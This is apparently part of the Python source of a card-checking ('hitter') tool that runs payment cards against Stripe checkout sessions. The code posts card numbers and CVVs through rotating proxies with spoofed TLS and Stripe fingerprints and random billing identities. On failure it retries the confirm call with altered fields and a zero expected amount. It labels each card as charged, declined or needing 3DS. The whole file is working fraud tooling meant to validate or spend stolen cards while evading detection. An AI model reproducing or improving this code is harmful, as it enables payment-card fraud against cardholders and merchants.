    total, subtotal = 0, 0
    if lig:   total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
    elif inv: total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
    else:
        pi_d = init_d.get("payment_intent") or {}
        total = subtotal = (pi_d.get("amount", 0) if isinstance(pi_d, dict) else 0)
    checksum = init_d.get("init_checksum", "")

    for attempt in range(max_retries + 1):
        try:
            use_proxy = None if attempt == 0 else proxy_url
            session   = _tls_client.Session(
                client_identifier=random.choice(TLS_BROWSER_PROFILES),
                random_tls_extension_order=True,
            )
            if use_proxy:
                session.proxies = {"http": use_proxy, "https": use_proxy}
            headers = _make_tls_headers()
            fp      = generate_stripe_fingerprint()
            addr    = billing["addr"]

            pm_data = {
                "type": "card",
                "card[number]":   card["cc"],
                "card[cvc]":      card["cvv"],
                "card[exp_month]":card["month"],
                "card[exp_year]": card["year"],
                "guid": fp["guid"], "muid": fp["muid"], "sid": fp["sid"],
                "pasted_fields": fp["pasted_fields"],
                "payment_user_agent": fp["payment_user_agent"],
                "referrer": "https://checkout.stripe.com",
                "key": pk,
                "billing_details[name]":                   billing["name"],
                "billing_details[email]":                  billing["email"],
                "billing_details[address][country]":       addr["country"],
                "billing_details[address][postal_code]":   addr["postal_code"],
                "billing_details[address][line1]":         addr["line1"],
                "billing_details[address][city]":          addr["city"],
                "billing_details[address][state]":         addr["state"],
            }
            pm_r = session.post(
                f"{STRIPE_API}/payment_methods",
                headers=headers, data=urlencode(pm_data),
            )
            pm = pm_r.json()

            use_direct = False
            pm_id = None
            if "error" in pm:
                msg = pm["error"].get("message", "")
                if any(x in msg.lower() for x in ("integration surface", "tokenization", "unsupported")):
                    use_direct = True
                else:
                    dc = pm["error"].get("decline_code", "") or pm["error"].get("code", "")
                    result["status"]       = _classify(dc, msg)
                    result["response"]     = _clean_response(msg)
                    result["decline_code"] = dc or "N/A"
                    result["time"]         = round(time.perf_counter() - start, 2)
                    return result
            else:
                pm_id = pm.get("id")

            conf: Dict[str, Any] = {
                "eid": "NA", "expected_payment_method_type": "card",
                "key": pk, "init_checksum": checksum,
                "return_url": "https://checkout.stripe.com",
                "consent[terms_of_service]": "accepted",
            }
            if use_direct:
                conf.update({
                    "payment_method_data[type]":                        "card",
                    "payment_method_data[card][number]":                card["cc"],
                    "payment_method_data[card][cvc]":                   card["cvv"],
                    "payment_method_data[card][exp_month]":             card["month"],
                    "payment_method_data[card][exp_year]":              card["year"],
                    "payment_method_data[guid]":                        fp["guid"],
                    "payment_method_data[muid]":                        fp["muid"],
                    "payment_method_data[sid]":                         fp["sid"],
                    "payment_method_data[billing_details][name]":       billing["name"],
                    "payment_method_data[billing_details][email]":      billing["email"],
                    "payment_method_data[billing_details][address][country]":     addr["country"],
                    "payment_method_data[billing_details][address][postal_code]": addr["postal_code"],
                    "payment_method_data[billing_details][address][line1]":       addr["line1"],
                    "payment_method_data[billing_details][address][city]":        addr["city"],
                    "payment_method_data[billing_details][address][state]":       addr["state"],
                })
                conf["expected_amount"] = 0
            else:
                conf["payment_method"] = pm_id
                if mode == "setup":
                    conf["expected_amount"] = 0
                else:
                    conf["expected_amount"] = total
                    conf["last_displayed_line_item_group_details[subtotal]"]             = subtotal
                    conf["last_displayed_line_item_group_details[total_exclusive_tax]"]  = 0
                    conf["last_displayed_line_item_group_details[total_inclusive_tax]"]  = 0
                    conf["last_displayed_line_item_group_details[total_discount_amount]"]= 0
                    conf["last_displayed_line_item_group_details[shipping_rate_amount]"] = 0

            cr = session.post(
                f"{STRIPE_API}/payment_pages/{cs}/confirm",
                headers=headers, data=urlencode(conf),
            )
            conf_result = cr.json()

            if _is_confirm_error_msg(conf_result):
                c2 = {k: v for k, v in conf.items()
                      if k not in ("consent[terms_of_service]",) and not k.startswith("last_displayed")}
                c2["expected_amount"] = 0
                cr2 = session.post(
                    f"{STRIPE_API}/payment_pages/{cs}/confirm",
                    headers=headers, data=urlencode(c2),
                )
                conf_result = cr2.json()

            return _parse_confirm_result(conf_result, checkout_data, result, start)

        except Exception as e:
            if attempt < max_retries:
                time.sleep(0.3)
                continue
            result["status"]   = "ERROR"
            result["response"] = str(e)[:50]
            result["time"]     = round(time.perf_counter() - start, 2)
            return result

    result["status"]   = "ERROR"
    result["response"] = "Max retries exceeded"
    result["time"]     = round(time.perf_counter() - start, 2)
    return result


# ══════════════════════════════════════════════════════════════════════════════
#  RESULT PARSER
# ══════════════════════════════════════════════════════════════════════════════

def _parse_confirm_result(
    conf: Dict[str, Any],
    checkout_data: Dict[str, Any],
    result: Dict[str, Any],
    start: float
) -> Dict[str, Any]:
    global _last_confirm_debug
    if "error" in conf:
        _last_confirm_debug.update(conf)
        err      = conf["error"]
        dc       = err.get("decline_code", "") or err.get("code", "")
        raw      = err.get("message", "Declined")
        msg_low  = raw.lower()
        if not dc and ("incorrect_cvc" in msg_low or "security code" in msg_low):
            dc = "incorrect_cvc"
        if "expired" in msg_low or "expired" in dc.lower():
            result.update({"status": "EXPIRED", "response": "Session expired"})
        elif "integration surface" in msg_low or "tokenization" in msg_low:
            result.update({"status": "NOT SUPPORTED", "response": "Checkout not supported"})
        else:
            status = _classify(dc, raw)
            result.update({
                "status":       status,
                "response":     f"[{dc}] {_clean_response(raw)}" if dc else _clean_response(raw),
                "decline_code": dc or "N/A",
            })
    else:
        _raw_pi = conf.get("payment_intent")
        _raw_si = conf.get("setup_intent")
        pi = _raw_pi if isinstance(_raw_pi, dict) else {}
        si = _raw_si if isinstance(_raw_si, dict) else {}
        _pi_id_str = _raw_pi if isinstance(_raw_pi, str) else ""
        st = pi.get("status", "") or si.get("status", "") or conf.get("status", "")

        if st in ("succeeded", "processing", "requires_capture"):
            price = checkout_data.get("price")
            cur   = (checkout_data.get("currency") or "").upper()
            result.update({
                "status":      "CHARGED",
                "response":    f"Charged {cur} {price}" if price else "Payment Successful",
                "success_url": conf.get("success_url") or pi.get("success_url") or checkout_data.get("success_url"),
            })
        elif st in ("requires_action", "requires_source_action"):
            _init_pi = (checkout_data.get("init_data") or {}).get("payment_intent")
            if not isinstance(_init_pi, dict):
                _init_pi = {}
            result.update({
                "status":           "3DS",
                "response":         "3DS Required",
                "pi_client_secret": pi.get("client_secret") or _init_pi.get("client_secret") or "",
                "pi_id":            pi.get("id") or _pi_id_str or _init_pi.get("id") or "",
            })
        elif st == "requires_payment_method":
            result.update({"status": "DECLINED", "response": "Card Declined"})
        elif conf.get("success_url") or conf.get("redirect_to_url"):
            result.update({"status": "CHARGED", "response": "Payment Successful"})
        else:
            result.update({"status": "UNKNOWN", "response": st or "Unknown"})

    result["time"] = round(time.perf_counter() - start, 2)
    return result


# ══════════════════════════════════════════════════════════════════════════════
#  LEGACY HELPERS (kept for backward compat with auto_hitter.py callers)
# ══════════════════════════════════════════════════════════════════════════════

def get_tls_session(proxy: str = None):
    if not TLS_CLIENT_OK:
        return None
    session = _tls_client.Session(
        client_identifier=random.choice(TLS_BROWSER_PROFILES),
        random_tls_extension_order=True,
    )
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session

def _resolve_billing(checkout_data: dict, init_data: dict,
                     custom_email: str = None, custom_name: str = None) -> dict:
    cust     = init_data.get("customer") or {}
    addr_raw = cust.get("address") or {}
    email    = custom_email or init_data.get("customer_email") or checkout_data.get("email") or generate_random_email()
    name     = custom_name or cust.get("name") or generate_random_name()
    addr     = generate_random_address()
    if addr_raw.get("line1"):
        addr["line1"] = addr_raw["line1"]
    if addr_raw.get("city"):
        addr["city"] = addr_raw["city"]
    if addr_raw.get("state"):
        addr["state"] = addr_raw["state"]
    if addr_raw.get("postal_code"):
        addr["postal_code"] = addr_raw["postal_code"]
    if addr_raw.get("country"):
        addr["country"] = addr_raw["country"]
    return {"email": email, "name": name, "addr": addr}

def _get_amounts(init_data: dict):
    lig = init_data.get("line_item_group")
    inv = init_data.get("invoice")
    if lig:
        return lig.get("total", 0), lig.get("subtotal", 0)
    if inv:
        return inv.get("total", 0), inv.get("subtotal", 0)
    pi = init_data.get("payment_intent")
    if isinstance(pi, dict) and pi.get("amount"):
        return pi["amount"], pi["amount"]
    return 0, 0


async def get_aio_session():
    global _aio_session
    if not AIOHTTP_OK:
        return None
    if _aio_session is None or _aio_session.closed:
        _aio_session = _aiohttp.ClientSession(
            connector=_aiohttp.TCPConnector(limit=100, ssl=False),
            timeout=_aiohttp.ClientTimeout(total=30, connect=10),
        )
    return _aio_session


# ══════════════════════════════════════════════════════════════════════════════
#  ASYNC WRAPPERS
# ══════════════════════════════════════════════════════════════════════════════

async def get_checkout_info(url: str, proxy: str = None) -> Dict[str, Any]:
    """Async wrapper for get_checkout_info_sync."""
    try:
        return await asyncio.to_thread(get_checkout_info_sync, url, proxy)
    except Exception as e:
        log.error("get_checkout_info error: %s", e)
        return {
            "url": url, "pk": None, "cs": None, "merchant": None,
            "price": None, "currency": None, "init_data": None,
            "error": str(e)[:80], "success_url": None,
            "checkout_mode": None, "customer_email": None,
        }


async def charge_card(
    card: Dict[str, str],
    checkout_data: Dict[str, Any],
    proxy: str = None,
    custom_email: str = None,
    custom_name: str = None,
) -> Dict[str, Any]:
    """Async wrapper for charge_card_sync (SEMEX engine)."""
    return await asyncio.to_thread(
        charge_card_sync, card, checkout_data, proxy, custom_email, custom_name
    )


def get_last_debug() -> Dict:
    return _last_confirm_debug
